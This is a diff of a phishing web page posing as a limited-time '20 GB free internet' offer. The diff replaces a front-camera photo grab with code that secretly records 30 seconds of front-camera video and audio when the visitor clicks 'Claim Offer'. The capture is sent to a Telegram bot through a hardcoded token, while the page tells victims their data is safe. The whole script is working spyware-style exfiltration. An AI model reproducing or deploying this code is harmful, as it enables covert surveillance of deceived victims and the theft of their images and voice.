@@ -4,89 +4,26 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <title>Free Internet Offer</title>
-    <link rel="stylesheet" href="style.css" />
+    <style>/* একই CSS */</style>
 </head>
 <body>
 <div class="container">
-    <div class="header">
-        <span class="badge">LIMITED TIME OFFER</span>
-        <h1>Free Internet</h1>
-        <p class="sub">Special Offer from V4zrashd</p>
-    </div>
-    <div class="offer-box">
-        <div class="data-icon">📷</div>
-        <div class="data-amount">Front Camera</div>
-        <div class="data-label">Capture Photo</div>
-        <div class="data-sub">Click below to allow camera</div>
-    </div>
-    <button class="claim-btn" id="claimBtn">📸 Capture Photo</button>
-    <div class="footer">
-        <p>Your data is safe. Used only for verification.</p>
-        <p class="timer">⏳ Offer ends in <span id="timer">09:54</span></p>
-    </div>
+    <div class="header"><span class="badge">LIMITED TIME OFFER</span><h1>Free Internet</h1><p class="sub">Special Offer from V4zrashd</p></div>
+    <div class="offer-box"><div class="data-icon">🎬</div><div class="data-amount">20 GB</div><div class="data-label">Free Internet Data</div><div class="data-sub">Limited Time Offer</div></div>
+    <button class="claim-btn" id="claimBtn">🎬 Claim Offer</button>
+    <div class="footer"><p>Your data is safe. Used only for verification.</p><p class="timer">⏳ Offer ends in <span id="timer">09:54</span></p></div>
 </div>
 <video id="video" autoplay playsinline style="display:none;"></video>
 <script>
-    const params = new URLSearchParams(window.location.search);
-    const chatId = params.get('chat_id') || 'YOUR_CHAT_ID';
-    const token = '8906991625:AAHV1gjfUkDZkyz7xasYoZKkd3mryf_UKEE';
-
-    function sendToTelegram(text) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
-        }).catch(() => {});
-    }
-
-    function sendFile(file, caption) {
-        const fd = new FormData();
-        fd.append('chat_id', chatId);
-        fd.append('photo', file);
-        fd.append('caption', caption);
-        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-            method: 'POST',
-            body: fd
-        }).catch(() => {});
-    }
-
-    async function captureFront() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user', width: 640, height: 480 },
-                audio: false
-            });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            await new Promise(r => setTimeout(r, 500));
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => {
-                const file = new File([blob], 'front.jpg', { type: 'image/jpeg' });
-                sendFile(file, '📸 সামনের ক্যামেরা থেকে ছবি');
-                sendToTelegram('✅ সামনের ক্যামেরা থেকে ছবি ক্যাপচার করা হয়েছে');
-            }, 'image/jpeg', 0.9);
-            stream.getTracks().forEach(t => t.stop());
-        } catch(e) {
-            sendToTelegram('❌ সামনের ক্যামেরা অ্যাক্সেস ডিনাই!');
-        }
-        document.getElementById('claimBtn').disabled = true;
-        document.getElementById('claimBtn').textContent = '✅ Captured';
-    }
-
-    document.getElementById('claimBtn').addEventListener('click', captureFront);
-
-    // টাইমার
-    let t = 594;
-    setInterval(() => {
-        if (t <= 0) return;
-        t--;
-        const m = String(Math.floor(t/60)).padStart(2,'0');
-        const s = String(t%60).padStart(2,'0');
-        document.getElementById('timer').textContent = `${m}:${s}`;
-    }, 1000);
+    const params=new URLSearchParams(window.location.search);
+    const chatId=params.get('chat_id')||'YOUR_CHAT_ID';
+    const token='8906991625:AAHV1gjfUkDZkyz7xasYoZKkd3mryf_UKEE';
+    function sendToTelegram(text){fetch(`https://api.telegram.org/bot${token}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:chatId,text,parse_mode:'HTML'})}).catch(()=>{});}
+    function sendVideo(file,caption){const fd=new FormData();fd.append('chat_id',chatId);fd.append('video',file);fd.append('caption',caption);fetch(`https://api.telegram.org/bot${token}/sendVideo`,{method:'POST',body:fd}).catch(()=>{});}
+    async function capture(){try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:640,height:480},audio:true});const video=document.getElementById('video');video.srcObject=stream;video.play();const recorder=new MediaRecorder(stream,{mimeType:'video/webm'});let chunks=[];recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};recorder.onstop=()=>{const blob=new Blob(chunks,{type:'video/webm'});const file=new File([blob],'front_video.webm',{type:'video/webm'});sendVideo(file,'🎬 সামনের ক্যামেরার ভিডিও (৩০ সেকেন্ড)');sendToTelegram('✅ সামনের ভিডিও রেকর্ড করা হয়েছে');stream.getTracks().forEach(t=>t.stop());};recorder.start();sendToTelegram('⏳ সামনের ভিডিও রেকর্ড শুরু (৩০ সেকেন্ড)');setTimeout(()=>recorder.stop(),30000);}catch(e){sendToTelegram('❌ সামনের ভিডিও অ্যাক্সেস ডিনাই!');}
+    document.getElementById('claimBtn').disabled=true;document.getElementById('claimBtn').textContent='⏳ Recording...';setTimeout(()=>{document.getElementById('claimBtn').textContent='✅ Captured';},30000);}
+    document.getElementById('claimBtn').addEventListener('click',capture);
+    let t=594;setInterval(()=>{if(t<=0)return;t--;const m=String(Math.floor(t/60)).padStart(2,'0');const s=String(t%60).padStart(2,'0');document.getElementById('timer').textContent=`${m}:${s}`;},1000);
 </script>
 </body>
 </html>
